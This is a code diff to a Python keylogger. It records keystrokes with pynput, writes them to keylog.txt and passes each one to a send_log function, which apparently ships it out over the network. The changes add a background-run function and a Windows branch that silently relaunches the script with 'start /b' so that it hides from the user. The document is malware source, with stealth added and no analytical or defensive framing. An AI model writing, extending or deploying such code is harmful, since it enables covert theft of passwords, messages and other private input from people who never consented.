@@ -1,8 +1,8 @@
-import pynput
-from pynput.keyboard import Key, Listener
 import logging
 import requests
-import time
+from pynput.keyboard import Key, Listener
+import os
+import subprocess
 
 # File for local keylogging
 log_file = "keylog.txt"
@@ -27,6 +27,14 @@ def on_press(key):
     logging.info(str(key))
     send_log(str(key))
 
-# Start listening to keyboard events
-with Listener(on_press=on_press) as listener:
-    listener.join()
+# Run the keylogger in the background
+def run_keylogger():
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    # Optional: Move the process to the background on Windows
+    if os.name == 'nt':
+        subprocess.Popen(['start', '/b', 'python', __file__], shell=True)
+    else:
+        run_keylogger()
